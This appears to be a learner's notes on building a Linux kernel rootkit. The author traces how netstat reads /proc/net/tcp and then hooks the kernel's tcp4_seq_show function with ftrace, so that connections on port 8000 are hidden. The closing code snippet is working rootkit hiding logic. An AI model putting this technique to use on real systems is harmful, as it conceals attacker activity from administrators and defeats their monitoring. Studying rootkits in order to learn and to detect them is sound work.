# level 3

from strace'ing netstat, it seems that the data comes from reading and parsing /proc/net/tcp file.

```
cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 251662 1 0000000000000000 100 0 0 10 0                    
   1: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 40139 1 0000000000000000 100 0 0 10 0                     
   2: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 36619 1 0000000000000000 100 0 0 10 5                     
   3: 803AA8C0:D062 95F1BDCE:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 186237 1 0000000000000000 20 4 28 10 -1                   
   4: 803AA8C0:C0E6 B3AF2734:01BB 01 00000000:00000000 02:000051DD 00000000  1000        0 69620 2 0000000000000000 20 4 28 10 -1                    
   5: 803AA8C0:DE52 1121E32C:01BB 08 00000000:0000004E 02:00001147 00000000  1000        0 88197 2 0000000000000000 68 4 0 10 -1                     
   6: 803AA8C0:8EFE EFED7522:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 257294 1 0000000000000000 22 4 30 10 -1

```

this^ is while having a python httpserver on port 8000.

```
openat(AT_FDCWD, "/proc/net/tcp", O_RDONLY) = 3
read(3, "  sl  local_address rem_address "..., 4096) = 1050

```

I can think of an option of how to solve this from here with syscall hooking:

hook the read syscall, and check if the opened file is /proc/net/tcp. if it is, remove the server line from the output.

- this will be complicated because if we hook the read function we only have an fd, not filename, and we will have to backtrack what the filename is.
- checking all the read outputs without checking if its relevant to us might have performance issues since read is a very common syscall in linux



both of the above options seem complicated to implement.

[this blog](https://xcellerator.github.io/posts/linux_rootkits_08/) reminded me that /proc is a virtual FS and not a real one, which means every read from it is actually outputted from a function in the kernel.

```bash
cat /proc/net/tcp
sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode ....
										.....snipped.....
```

I saw this print format, and decided to grep it in the linux kernel sources.

```bash
 grep rem_address -irnI .
 /net/ipv4/tcp_ipv4.c:2655:             seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
./net/ipv4/ping.c:1146:         seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
./net/ipv4/raw.c:1073:          seq_printf(seq, "  sl  local_address rem_address   st tx_queue "
./net/ipv4/udp.c:3094:          seq_puts(seq, "   sl  local_address rem_address   st tx_queue "

```

seems like the relevant one is /net/ipv4/tcp_ipv4.c

```c
static int tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct tcp_iter_state *st;
	struct sock *sk = v;

	seq_setwidth(seq, TMPSZ - 1);
	if (v == SEQ_START_TOKEN) {
		seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
			   "rx_queue tr tm->when retrnsmt   uid  timeout "
			   "inode");
		goto out;
	}
	st = seq->private;

	if (sk->sk_state == TCP_TIME_WAIT)
		get_timewait4_sock(v, seq, st->num);
	else if (sk->sk_state == TCP_NEW_SYN_RECV)
		get_openreq4(v, seq, st->num);
	else
		get_tcp4_sock(v, seq, st->num);
out:
	seq_pad(seq, '\n');
	return 0;
}
```

seems like this function is called for every line of output. if I hook it and make sure it doesn't print out the line with my chosen port, then I can effectively hide it.

```c
static void get_tcp4_sock(struct sock *sk, struct seq_file *f, int i)
{
	int timer_active;
	unsigned long timer_expires;
	const struct tcp_sock *tp = tcp_sk(sk);
	const struct inet_connection_sock *icsk = inet_csk(sk);
	const struct inet_sock *inet = inet_sk(sk);
	const struct fastopen_queue *fastopenq = &icsk->icsk_accept_queue.fastopenq;
	__e32 dest = inet->inet_daddr;
	__be32 src = inet->inet_rcv_saddr;
	__u16 destp = ntohs(inet->inet_dport);
	__u16 srcp = ntohs(inet->inet_sport);
	int rx_queue;
	int state;

	if (icsk->icsk_pending == ICSK_TIME_RETRANS ||
	    icsk->icsk_pending == ICSK_TIME_REO_TIMEOUT ||
	    icsk->icsk_pending == ICSK_TIME_LOSS_PROBE) {
		timer_active	= 1;
		timer_expires	= icsk->icsk_timeout;
	} else if (icsk->icsk_pending == ICSK_TIME_PROBE0) {
		timer_active	= 4;
		timer_expires	= icsk->icsk_timeout;
	} else if (timer_pending(&sk->sk_timer)) {
		timer_active	= 2;
		timer_expires	= sk->sk_timer.expires;
	} else {
		timer_active	= 0;
		timer_expires = jiffies;
	}

	state = inet_sk_state_load(sk);
	if (state == TCP_LISTEN)
		rx_queue = READ_ONCE(sk->sk_ack_backlog);
	else
		/* Because we don't lock the socket,
		 * we might find a transient negative value.
		 */
		rx_queue = max_t(int, READ_ONCE(tp->rcv_nxt) -
				      READ_ONCE(tp->copied_seq), 0);

	seq_printf(f, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X %02X:%08lX "
			"%08X %5u %8d %lu %d %pK %lu %lu %u %u %d",
		i, src, srcp, dest, destp, state,
		READ_ONCE(tp->write_seq) - tp->snd_una,
		rx_queue,
		timer_active,
		jiffies_delta_to_clock_t(timer_expires - jiffies),
		icsk->icsk_retransmits,
		from_kuid_munged(seq_user_ns(f), sock_i_uid(sk)),
		icsk->icsk_probes_out,
		sock_i_ino(sk),
		refcount_read(&sk->sk_refcnt), sk,
		jiffies_to_clock_t(icsk->icsk_rto),
		jiffies_to_clock_t(icsk->icsk_ack.ato),
		(icsk->icsk_ack.quick << 1) | inet_csk_in_pingpong_mode(sk),
		tcp_snd_cwnd(tp),
		state == TCP_LISTEN ?
		    fastopenq->max_qlen :
		    (tcp_in_initial_slowstart(tp) ? -1 : tp->snd_ssthresh));
}
```

from here ^ I can see that it is going to be pretty easy, we just need to create an inet_sock from the socket buffer like here:

```c
	const struct inet_sock *inet = inet_sk(sk);
	if(srcp ==  my_rootkit_port){
        //do_bad_stuff
    }
```

and hook this logic before tcp4_seq_show output is called.



I will be using ftrace to hook the function. 
I wanted to use the helper module [this dude wrote](https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h), but it didn't go so well, because in my kernel the C api changed- mostly names of structs and enums- this was easy enough to fix, but also because he relies on kallsyms_lookup_name function being exported, which it isn't in my kernel, so I need to solve it.

This is mostly a technical issue since I already dealt with it in my lkm code, but I need to give it to the helper as well.

Perhaps I need to put it in a seperate header file and include it in both the module and the helper.

did it and now it works.



currently stuck in a situation where the process of hooking with ftrace somehow crashes the kernel, and i'm unable to debug it properly.

I should properly step up my debug game- printk is not enough and doesn't help at all in the case of crashes.





I've decided its better to write every step of the rootkit in a seperate module, for better debugging.

when I seperated it into 2 files it suddenly worked- no idea what happened here, but it seems I entered a rabbit hole of debugging it.

since all that these functions do is print stuff, I feel comfortable messsing them up and making them not print the line with my server. every call to the function is returning one line, and it returns 0 if it succeeds, so no harm in returning early and printing an empty line if it contains our intended source port.

```c
inet = inet_sk(sk);
	srcp = ntohs(inet->inet_sport);
	if (srcp == 8000){
		printk(KERN_INFO "netstat_rootkit: identified tcp traffic to port 8000\n");
		seq_puts(seq, "");
		return 0;
	}
	return old_tcp4_seq_show(seq, v);
```

now netstat -ant doesn't show my server.



and thats level 3 done.
